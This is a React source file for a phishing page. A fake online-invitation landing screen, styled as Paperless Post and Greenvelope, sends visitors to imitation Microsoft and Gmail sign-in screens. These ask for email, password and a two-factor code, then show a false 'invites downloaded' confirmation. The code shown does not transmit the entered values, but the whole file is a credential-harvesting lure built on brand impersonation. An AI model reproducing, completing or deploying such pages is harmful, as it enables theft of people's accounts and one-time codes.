import React, { useState, useEffect } from 'react';

const EmailAuthApp = () => {
  const [currentView, setCurrentView] = useState('landing');
  const [provider, setProvider] = useState('');
  const [email, setEmail] = useState('');

  useEffect(() => {
    if (currentView === 'gmail-loading') {
      const timer = setTimeout(() => {
        setCurrentView('gmail-otp');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [currentView]);

  const handleProviderSelect = (selectedProvider) => {
    setProvider(selectedProvider);
    if (selectedProvider === 'outlook' || selectedProvider === 'office365') {
      setCurrentView('ms-email');
    } else if (selectedProvider === 'gmail') {
      setCurrentView('gmail-email');
    }
  };

  const handleBack = () => {
    setCurrentView('landing');
    setProvider('');
    setEmail('');
  };

  return (
    <div className="app-container">
      <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .app-container {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        /* Landing Page Styles */
        .landing-container {
          background: linear-gradient(180deg, #2a2a2a 0%, #1a1a1a 100%);
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .landing-card {
          background: #2d2d2d;
          border-radius: 16px;
          padding: 40px 30px;
          max-width: 400px;
          width: 100%;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .landing-logo {
          text-align: center;
          margin-bottom: 20px;
        }

        .landing-logo-text {
          font-size: 32px;
          font-weight: bold;
          color: white;
          font-family: 'Brush Script MT', cursive;
        }

        .landing-post {
          font-size: 12px;
          color: #999;
          letter-spacing: 2px;
        }

        .landing-title {
          color: white;
          text-align: center;
          font-size: 20px;
          font-weight: 600;
          margin-bottom: 15px;
          line-height: 1.4;
        }

        .landing-description {
          color: #b0b0b0;
          text-align: center;
          font-size: 13px;
          margin-bottom: 30px;
          line-height: 1.6;
        }

        .provider-button {
          width: 100%;
          padding: 14px 20px;
          margin-bottom: 12px;
          border: none;
          border-radius: 8px;
          font-size: 15px;
          font-weight: 600;
          color: white;
          cursor: pointer;
          display: flex;
          align-items: center;
          transition: opacity 0.2s;
        }

        .provider-button:hover {
          opacity: 0.9;
        }

        .provider-icon {
          width: 24px;
          height: 24px;
          margin-right: 12px;
          background: white;
          border-radius: 4px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: bold;
          font-size: 12px;
        }

        .outlook-btn {
          background: #0078d4;
        }

        .office365-btn {
          background: #d83b01;
        }

        .gmail-btn {
          background: #d93025;
        }

        .landing-footer {
          color: #888;
          text-align: center;
          font-size: 11px;
          margin-top: 30px;
          line-height: 1.5;
        }

        /* Microsoft Auth Styles */
        .ms-container {
          background: linear-gradient(135deg, #fce4ec 0%, #e8f5e9 100%);
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
          position: relative;
        }

        .ms-card {
          background: white;
          border-radius: 8px;
          padding: 44px 44px 32px;
          max-width: 440px;
          width: 100%;
          box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
        }

        .ms-logo {
          display: flex;
          align-items: center;
          margin-bottom: 24px;
        }

        .ms-logo-icon {
          width: 108px;
          height: 24px;
          margin-right: 8px;
          display: flex;
          align-items: center;
        }

        .ms-logo-squares {
          display: grid;
          grid-template-columns: repeat(2, 11px);
          grid-gap: 1px;
          margin-right: 8px;
        }

        .ms-square {
          width: 11px;
          height: 11px;
        }

        .ms-logo-text {
          font-size: 17px;
          font-weight: 600;
          color: #5e5e5e;
        }

        .ms-title {
          font-size: 24px;
          font-weight: 600;
          color: #1b1b1b;
          margin-bottom: 8px;
        }

        .ms-subtitle {
          font-size: 15px;
          color: #605e5c;
          margin-bottom: 24px;
        }

        .ms-input {
          width: 100%;
          padding: 10px 12px;
          font-size: 15px;
          border: none;
          border-bottom: 1px solid #605e5c;
          outline: none;
          color: #1b1b1b;
          background: transparent;
          margin-bottom: 8px;
        }

        .ms-input:focus {
          border-bottom: 2px solid #0078d4;
          padding-bottom: 9px;
        }

        .ms-input::placeholder {
          color: #a19f9d;
        }

        .ms-link {
          color: #0067b8;
          text-decoration: none;
          font-size: 13px;
          display: inline-block;
          margin-top: 12px;
        }

        .ms-link:hover {
          text-decoration: underline;
        }

        .ms-button {
          background: #0067b8;
          color: white;
          border: none;
          padding: 10px 24px;
          font-size: 15px;
          font-weight: 600;
          border-radius: 2px;
          cursor: pointer;
          float: right;
          margin-top: 24px;
        }

        .ms-button:hover {
          background: #005a9e;
        }

        .ms-options {
          background: white;
          border: 1px solid #8a8886;
          border-radius: 4px;
          padding: 12px;
          margin-top: 24px;
          display: flex;
          align-items: center;
          cursor: pointer;
          max-width: 440px;
          width: 100%;
        }

        .ms-options:hover {
          background: #f3f2f1;
        }

        .ms-key-icon {
          width: 20px;
          height: 20px;
          margin-right: 12px;
        }

        .ms-options-text {
          color: #201f1e;
          font-size: 15px;
        }

        .ms-footer {
          background: #f3f2f1;
          padding: 16px;
          position: absolute;
          bottom: 0;
          left: 0;
          right: 0;
          display: flex;
          align-items: center;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 16px;
        }

        .ms-footer-links {
          display: flex;
          gap: 24px;
        }

        .ms-footer-link {
          color: #605e5c;
          text-decoration: none;
          font-size: 13px;
        }

        .ms-footer-link:hover {
          text-decoration: underline;
        }

        .ms-footer-info {
          font-size: 13px;
          color: #605e5c;
        }

        .ms-info-link {
          color: #0067b8;
          text-decoration: none;
        }

        .ms-info-link:hover {
          text-decoration: underline;
        }

        /* Gmail Auth Styles */
        .gmail-container {
          background: #202124;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          padding: 20px;
        }

        .gmail-content {
          flex: 1;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          max-width: 450px;
          width: 100%;
          margin: 0 auto;
          padding-top: 60px;
        }

        .gmail-logo {
          width: 75px;
          height: 75px;
          margin-bottom: 24px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .google-g {
          font-size: 48px;
          font-weight: bold;
          background: linear-gradient(90deg, #4285f4 0%, #ea4335 25%, #fbbc04 50%, #34a853 75%, #4285f4 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .gmail-title {
          font-size: 24px;
          font-weight: 400;
          color: #e8eaed;
          margin-bottom: 8px;
        }

        .gmail-subtitle {
          font-size: 16px;
          color: #e8eaed;
          margin-bottom: 32px;
        }

        .gmail-input-wrapper {
          width: 100%;
          margin-bottom: 24px;
        }

        .gmail-input {
          width: 100%;
          padding: 16px;
          font-size: 16px;
          color: #e8eaed;
          background: transparent;
          border: 1px solid #5f6368;
          border-radius: 4px;
          outline: none;
        }

        .gmail-input:focus {
          border: 2px solid #8ab4f8;
          padding: 15px;
        }

        .gmail-input::placeholder {
          color: #9aa0a6;
        }

        .gmail-link {
          color: #8ab4f8;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
          display: inline-block;
          margin-bottom: 24px;
        }

        .gmail-link:hover {
          text-decoration: underline;
        }

        .gmail-info {
          font-size: 14px;
          color: #e8eaed;
          margin-bottom: 24px;
          line-height: 1.5;
        }

        .gmail-actions {
          width: 100%;
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-top: 32px;
        }

        .gmail-button {
          background: #8ab4f8;
          color: #202124;
          border: none;
          padding: 10px 24px;
          font-size: 14px;
          font-weight: 500;
          border-radius: 4px;
          cursor: pointer;
        }

        .gmail-button:hover {
          background: #aecbfa;
        }

        .gmail-footer {
          padding: 20px 0;
          display: flex;
          justify-content: space-between;
          align-items: center;
          max-width: 450px;
          width: 100%;
          margin: 0 auto;
        }

        .gmail-footer-left {
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .gmail-footer-select {
          background: transparent;
          color: #e8eaed;
          border: none;
          font-size: 12px;
          cursor: pointer;
          outline: none;
        }

        .gmail-footer-right {
          display: flex;
          gap: 24px;
        }

        .gmail-footer-link {
          color: #e8eaed;
          text-decoration: none;
          font-size: 12px;
        }

        .gmail-footer-link:hover {
          text-decoration: underline;
        }

        .gmail-account-selector {
          display: flex;
          align-items: center;
          padding: 12px 16px;
          border: 1px solid #5f6368;
          border-radius: 24px;
          margin-bottom: 32px;
          cursor: pointer;
          width: 100%;
        }

        .gmail-account-icon {
          width: 32px;
          height: 32px;
          background: #5f6368;
          border-radius: 50%;
          margin-right: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #e8eaed;
          font-size: 14px;
        }

        .gmail-account-email {
          color: #e8eaed;
          font-size: 14px;
          flex: 1;
        }

        .gmail-dropdown-icon {
          color: #9aa0a6;
          font-size: 20px;
        }

        .gmail-password-group {
          width: 100%;
          margin-bottom: 16px;
        }

        .gmail-password-label {
          display: block;
          color: #5f6368;
          font-size: 12px;
          margin-bottom: 24px;
          border: 1px solid #5f6368;
          padding: 16px;
          border-radius: 4px;
          position: relative;
        }

        .gmail-password-label-text {
          position: absolute;
          top: -8px;
          left: 12px;
          background: #202124;
          padding: 0 4px;
          font-size: 12px;
          color: #9aa0a6;
        }

        .gmail-password-input {
          width: 100%;
          background: transparent;
          border: none;
          outline: none;
          color: #e8eaed;
          font-size: 16px;
        }

        .gmail-checkbox-group {
          display: flex;
          align-items: center;
          margin-bottom: 24px;
        }

        .gmail-checkbox {
          margin-right: 8px;
          width: 16px;
          height: 16px;
          cursor: pointer;
        }

        .gmail-checkbox-label {
          color: #e8eaed;
          font-size: 14px;
          cursor: pointer;
        }

        /* Loading Screen */
        .gmail-loading {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          min-height: 60vh;
        }

        .spinner {
          width: 48px;
          height: 48px;
          border: 4px solid #5f6368;
          border-top-color: #8ab4f8;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin-bottom: 24px;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .loading-text {
          color: #e8eaed;
          font-size: 16px;
          margin-bottom: 8px;
        }

        .loading-subtext {
          color: #9aa0a6;
          font-size: 14px;
        }

        /* Success Screen */
        .success-container {
          background: rgba(0, 0, 0, 0.8);
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .success-card {
          background: #2d2d2d;
          border-radius: 16px;
          padding: 48px 40px;
          max-width: 440px;
          width: 100%;
          text-align: center;
        }

        .success-icon {
          width: 80px;
          height: 80px;
          background: #2e7d32;
          border-radius: 50%;
          margin: 0 auto 24px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .checkmark {
          color: white;
          font-size: 48px;
          font-weight: bold;
        }

        .success-title {
          color: white;
          font-size: 24px;
          font-weight: 600;
          margin-bottom: 12px;
        }

        .success-subtitle {
          color: #b0b0b0;
          font-size: 14px;
          margin-bottom: 32px;
        }

        .success-button {
          background: #2e7d32;
          color: white;
          border: none;
          padding: 14px 32px;
          font-size: 16px;
          font-weight: 600;
          border-radius: 8px;
          cursor: pointer;
          width: 100%;
        }

        .success-button:hover {
          background: #1b5e20;
        }

        .clearfix::after {
          content: "";
          display: table;
          clear: both;
        }
      `}</style>

      {/* Landing Page */}
      {currentView === 'landing' && (
        <div className="landing-container">
          <div className="landing-card">
            <div className="landing-logo">
              <div className="landing-logo-text">Paperless</div>
              <div className="landing-post">POST</div>
            </div>
            <h1 className="landing-title">
              Manage your Online Invitations &<br />Greeting Card
            </h1>
            <p className="landing-description">
              To view the invitation, please select your email provider below and log in. You were invited to access the invitation on Greenvelope.
            </p>
            <button className="provider-button outlook-btn" onClick={() => handleProviderSelect('outlook')}>
              <div className="provider-icon">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <rect width="16" height="16" fill="#0078d4" rx="2"/>
                  <text x="8" y="12" fontSize="12" fill="white" textAnchor="middle" fontWeight="bold">O</text>
                </svg>
              </div>
              Sign in with Outlook
            </button>
            <button className="provider-button office365-btn" onClick={() => handleProviderSelect('office365')}>
              <div className="provider-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              Sign in with Office365
            </button>
            <button className="provider-button gmail-btn" onClick={() => handleProviderSelect('gmail')}>
              <div className="provider-icon" style={{background: 'transparent'}}>
                <span className="google-g" style={{fontSize: '16px'}}>G</span>
              </div>
              Sign in with Gmail
            </button>
            <div className="landing-footer">
              Online invitations & birthday cards. greenvelope simplifies event planning with user-friendly tools for managing online invites.
              <br /><br />
              © 2026 Sincere Corporation. greenvelope is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of respective.
            </div>
          </div>
        </div>
      )}

      {/* Microsoft - Email Entry */}
      {currentView === 'ms-email' && (
        <div className="ms-container">
          <div className="ms-card">
            <div className="ms-logo">
              <div className="ms-logo-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              <span className="ms-logo-text">Microsoft</span>
            </div>
            <h1 className="ms-title">Sign in</h1>
            <p className="ms-subtitle">to continue to Outlook</p>
            <div>
              <input 
                type="text" 
                className="ms-input" 
                placeholder="Email, phone, or Skype"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <a href="#" className="ms-link">No account? Create one!</a>
            </div>
            <div className="clearfix">
              <button className="ms-button" onClick={() => setCurrentView('ms-password')}>Next</button>
            </div>
          </div>
          <div className="ms-options">
            <svg className="ms-key-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
            </svg>
            <span className="ms-options-text">Sign-in options</span>
          </div>
        </div>
      )}

      {/* Microsoft - Password Entry */}
      {currentView === 'ms-password' && (
        <div className="ms-container">
          <div className="ms-card">
            <div className="ms-logo">
              <div className="ms-logo-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              <span className="ms-logo-text">Microsoft</span>
            </div>
            <h1 className="ms-title">Enter your password</h1>
            <p className="ms-subtitle">for the account: {email || 'nnman@gmail.com'}</p>
            <div>
              <input 
                type="password" 
                className="ms-input" 
                placeholder="Password"
              />
            </div>
            <div className="clearfix">
              <button className="ms-button" onClick={() => setCurrentView('ms-otp')}>Sign in</button>
            </div>
          </div>
        </div>
      )}

      {/* Microsoft - OTP Entry */}
      {currentView === 'ms-otp' && (
        <div className="ms-container">
          <div className="ms-card">
            <div className="ms-logo">
              <div className="ms-logo-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              <span className="ms-logo-text">Microsoft</span>
            </div>
            <h1 className="ms-title">Enter the code</h1>
            <p className="ms-subtitle">We've sent a code to your Phone for the account:</p>
            <div>
              <input 
                type="text" 
                className="ms-input" 
                placeholder="Enter 6-digit code"
                maxLength="6"
              />
            </div>
            <div className="clearfix">
              <button className="ms-button" onClick={() => setCurrentView('success')}>Next</button>
            </div>
          </div>
          <div className="ms-footer">
            <div className="ms-footer-links">
              <a href="#" className="ms-footer-link">Terms of use</a>
              <a href="#" className="ms-footer-link">Privacy & cookies</a>
              <span className="ms-footer-link">...</span>
            </div>
            <span className="ms-footer-info">
              Use private browsing if this is not your device. <a href="#" className="ms-info-link">Learn more</a>
            </span>
          </div>
        </div>
      )}

      {/* Gmail - Email Entry */}
      {currentView === 'gmail-email' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <span className="google-g">G</span>
            </div>
            <h1 className="gmail-title">Sign in</h1>
            <p className="gmail-subtitle">to continue to Gmail</p>
            <div className="gmail-input-wrapper">
              <input 
                type="text" 
                className="gmail-input" 
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <a href="#" className="gmail-link">Forgot email?</a>
            <p className="gmail-info">
              Not your computer? Use Guest mode to sign in privately. <a href="#" className="gmail-link">Learn more about using Guest mode</a>
            </p>
            <div className="gmail-actions">
              <a href="#" className="gmail-link">Create account</a>
              <button className="gmail-button" onClick={() => setCurrentView('gmail-password')}>Next</button>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Gmail - Password Entry */}
      {currentView === 'gmail-password' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <span className="google-g">G</span>
            </div>
            <h1 className="gmail-title">Welcome</h1>
            <div className="gmail-account-selector">
              <div className="gmail-account-icon">👤</div>
              <span className="gmail-account-email">{email || 'nnman@gmail.com'}</span>
              <span className="gmail-dropdown-icon">▼</span>
            </div>
            <div className="gmail-password-group">
              <div className="gmail-password-label">
                <span className="gmail-password-label-text">Enter your password</span>
                <input 
                  type="password" 
                  className="gmail-password-input"
                />
              </div>
            </div>
            <div className="gmail-checkbox-group">
              <input type="checkbox" className="gmail-checkbox" id="show-password" />
              <label htmlFor="show-password" className="gmail-checkbox-label">Show password</label>
            </div>
            <div className="gmail-actions">
              <a href="#" className="gmail-link">Forgot password?</a>
              <button className="gmail-button" onClick={() => setCurrentView('gmail-loading')}>Next</button>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Gmail - Loading */}
      {currentView === 'gmail-loading' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <span className="google-g">G</span>
            </div>
            <h1 className="gmail-title">Sign in</h1>
            <p className="gmail-subtitle">to continue to Gmail</p>
            <div className="gmail-loading">
              <div className="spinner"></div>
              <p className="loading-text">Please wait...</p>
              <p className="loading-subtext">Do not close or refresh this page</p>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Gmail - OTP Entry */}
      {currentView === 'gmail-otp' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <span className="google-g">G</span>
            </div>
            <h1 className="gmail-title">2-Step Verification</h1>
            <p className="gmail-subtitle">To continue, first verify it's you</p>
            <p className="gmail-info" style={{marginBottom: '24px'}}>
              Google sent a notification to your phone. Tap <strong>Yes</strong> on the notification, then tap <strong>1</strong> on your phone to sign in.
            </p>
            <div className="gmail-input-wrapper">
              <input 
                type="text" 
                className="gmail-input" 
                placeholder="Enter code"
                maxLength="6"
              />
            </div>
            <a href="#" className="gmail-link">Try another way</a>
            <div className="gmail-actions">
              <a href="#" className="gmail-link">Resend code</a>
              <button className="gmail-button" onClick={() => setCurrentView('success')}>Next</button>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Success Screen */}
      {currentView === 'success' && (
        <div className="success-container">
          <div className="success-card">
            <div className="success-icon">
              <span className="checkmark">✓</span>
            </div>
            <h1 className="success-title">Done — invites downloaded</h1>
            <p className="success-subtitle">You can close this window or go back home.</p>
            <button className="success-button" onClick={handleBack}>Back to Home</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default EmailAuthApp;